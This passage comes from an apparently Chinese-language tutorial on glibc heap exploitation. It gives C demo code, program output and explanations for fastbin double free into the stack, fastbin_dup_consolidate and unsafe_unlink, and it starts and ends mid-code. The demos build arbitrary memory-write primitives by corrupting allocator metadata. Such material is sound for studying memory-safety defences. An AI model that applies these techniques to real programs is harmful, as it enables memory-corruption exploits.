</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=o>*</span><span class=n>b</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=o>*</span><span class=n>c</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the first one...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If we free %p again, things will crash because %p is at the top of the free list.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// free(a);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;So, instead, we&#39;ll free %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we can free %p again, since it&#39;s not the head of the free list.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the free list has [%p, %p, %p]. &#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;We&#39;ll now carry out our attack by modifying data at %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=o>*</span><span class=n>d</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the free list has [%p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we have access to %p while it remains at the head of the free list.</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;so now we are writing a fake free size (in this case, 0x20) to the stack,</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;so that malloc will think there is a free chunk there and agree to</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;return a pointer to it.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>stack_var</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=n>d</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(((</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=p>)</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>d</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(8): %p, putting the stack address on the free list</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;4th malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file extends on fastbin_dup.c by tricking malloc into
</span></span><span class=line><span class=cl>returning a pointer to a controlled location (in this case, the stack).
</span></span><span class=line><span class=cl>The address we want malloc() to return is 0x7ffe1610b248.
</span></span><span class=line><span class=cl>Allocating 3 buffers.
</span></span><span class=line><span class=cl>1st malloc(8): 0x1e3a010
</span></span><span class=line><span class=cl>2nd malloc(8): 0x1e3a030
</span></span><span class=line><span class=cl>3rd malloc(8): 0x1e3a050
</span></span><span class=line><span class=cl>Freeing the first one...
</span></span><span class=line><span class=cl>If we free 0x1e3a010 again, things will crash because 0x1e3a010 is at the top of the free list.
</span></span><span class=line><span class=cl>So, instead, we&#39;ll free 0x1e3a030.
</span></span><span class=line><span class=cl>Now, we can free 0x1e3a010 again, since it&#39;s not the head of the free list.
</span></span><span class=line><span class=cl>Now the free list has [0x1e3a010, 0x1e3a030, 0x1e3a010]. We&#39;ll now carry out our attack by modifying data at 0x1e3a010.
</span></span><span class=line><span class=cl>1st malloc(8): 0x1e3a010
</span></span><span class=line><span class=cl>2nd malloc(8): 0x1e3a030
</span></span><span class=line><span class=cl>Now the free list has [0x1e3a010].
</span></span><span class=line><span class=cl>Now, we have access to 0x1e3a010 while it remains at the head of the free list.
</span></span><span class=line><span class=cl>so now we are writing a fake free size (in this case, 0x20) to the stack,
</span></span><span class=line><span class=cl>so that malloc will think there is a free chunk there and agree to
</span></span><span class=line><span class=cl>return a pointer to it.
</span></span><span class=line><span class=cl>Now, we overwrite the first 8 bytes of the data at 0x1e3a010 to point right before the 0x20.
</span></span><span class=line><span class=cl>3rd malloc(8): 0x1e3a010, putting the stack address on the free list
</span></span><span class=line><span class=cl>4th malloc(8): 0x7ffe1610b248
</span></span></code></pre></td></tr></table></div></div><p>这里利用上一个例子的 <code>double free</code> 漏洞，来让 <code>malloc</code> 返回一个任意地址（并不一定是栈上地址），从而实现任意地址读写。首先还是以 <code>a->b->a</code> 的顺序释放内存，随后两次 <code>malloc</code> 使得 <code>d</code> 指向原来 <code>a</code> 指向的地址 <code>0x1e3a010</code>，并且 freelist 里只剩一个 <code>0x1e3a010</code>。</p><p>现在修改栈上变量 <code>stack_var</code> 的值为 <code>0x20</code>，这是为了伪造 <code>chunk_size</code> 头部让 <code>malloc</code> 以为这个地方有一个 chunk。这还不够，我们还需要让这个 chunk 被认为是空闲的，也就是要把它加入 freelist 中。</p><p>怎么做呢？我们知道，对于一个空闲 chunk 来说，<code>chunk_size</code> 下面就是 <code>fd</code>，存放下一个空闲 chunk 的地址。而 <code>malloc</code> 返回给用户的指针 <code>mem</code>（在这个例子中，<code>0x1e3a010</code>）恰好指向 <code>chunk_size</code> 的结尾处，也就是 <code>fd</code> 开始位置。现在我们拥有 <code>d</code> 指针，也就能修改这个位置的值让它指向 <code>stack_var</code> 的前一个栈单元（这里是向前 8 字节），这里就是这个伪造 chunk 的 <code>chunk</code> 指针。这样一来，当我们进行 <code>3rd malloc(8)</code> 时，该 <code>chunk</code> 指针就会进入 freelist 里，最后 <code>malloc</code> 的时候就会返回这个伪造 chunk 的 <code>mem</code> 指针。</p><p>注意栈从高地址向低地址生长，堆反过来，所以源码一开始是 <code>8+(char *)&stack_var</code>，而最后是 <code>((char*)&stack_var) - sizeof(d)</code>。</p><h2 id=fastbin_dup_consolidate>fastbin_dup_consolidate</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span> <span class=n>p1</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span> <span class=n>p2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocated two fastbins: p1=%p p2=%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now free p1!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span> <span class=n>p3</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocated large bin to trigger malloc_consolidate(): p3=%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;In malloc_consolidate(), p1 is moved to the unsorted bin.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Trigger the double free vulnerability!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We can pass the check in malloc() since p1 is not fast top.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: %p %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x40</span><span class=p>),</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x40</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Allocated two fastbins: p1=0x1af0010 p2=0x1af0060
</span></span><span class=line><span class=cl>Now free p1!
</span></span><span class=line><span class=cl>Allocated large bin to trigger malloc_consolidate(): p3=0x1af00b0
</span></span><span class=line><span class=cl>In malloc_consolidate(), p1 is moved to the unsorted bin.
</span></span><span class=line><span class=cl>Trigger the double free vulnerability!
</span></span><span class=line><span class=cl>We can pass the check in malloc() since p1 is not fast top.
</span></span><span class=line><span class=cl>Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: 0x1af0010 0x1af0010
</span></span></code></pre></td></tr></table></div></div><p>首先分配了两个 0x40 的 chunk，实际大小为 0x50。需要 p2 是为了之后释放 p1 时不会和 top chunk 合并。随后释放其中一个并申请 0x400 的 chunk，这时会尝试从 unsorted bin 中切割，但是空间不足，触发了 <code>malloc_consolidate</code>，使得 fastbin 中的 p1 进入 unsorted bin（实际上，如果此时有多个连续 chunk 在 fastbin 中，会先合并）中。</p><p>这个时候，fastbin 链表头部没有 p1 了，所以我们再次 <code>free(p1)</code> 就可以成功，造成 double free。现在 fastbin 和 unsorted bin 中都有 p1 了，我们可以两次 <code>malloc()</code> 拿到两个同样的指针。</p><h2 id=unsafe_unlink>unsafe_unlink</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=o>*</span><span class=n>chunk0_ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Welcome to unsafe unlink 2.0!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Tested in Ubuntu 14.04/16.04 64bit.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This technique can be used when you have a pointer at a known location to a region you can call unlink on.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>malloc_size</span> <span class=o>=</span> <span class=mh>0x80</span><span class=p>;</span> <span class=c1>//we want to be big enough not to use fastbins
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>int</span> <span class=n>header_size</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>chunk0_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span> <span class=n>malloc</span><span class=p>(</span><span class=n>malloc_size</span><span class=p>);</span> <span class=c1>//chunk0
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>uint64_t</span> <span class=o>*</span><span class=n>chunk1_ptr</span>  <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span> <span class=n>malloc</span><span class=p>(</span><span class=n>malloc_size</span><span class=p>);</span> <span class=c1>//chunk1
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The global chunk0_ptr is at %p, pointing to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>chunk0_ptr</span><span class=p>,</span> <span class=n>chunk0_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The victim chunk we are going to corrupt is at %p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>chunk1_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We create a fake chunk inside chunk0.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We setup the &#39;next_free_chunk&#39; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>chunk0_ptr</span><span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We setup the &#39;previous_free_chunk&#39; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>chunk0_ptr</span><span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Fake chunk fd: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Fake chunk bk: %p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint64_t</span> <span class=o>*</span><span class=n>chunk1_hdr</span> <span class=o>=</span> <span class=n>chunk1_ptr</span> <span class=o>-</span> <span class=n>header_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We shrink the size of chunk0 (saved as&#39;previous_size&#39;in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;It&#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>chunk1_hdr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>malloc_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If we had &#39;normally&#39; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>chunk1_hdr</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We mark our fake chunk as free by setting &#39;previous_in_use&#39; of chunk1 as False.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>chunk1_hdr</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&amp;=</span> <span class=o>~</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>chunk1_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>victim_string</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>victim_string</span><span class=p>,</span><span class=s>&#34;Hello!~&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=n>victim_string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
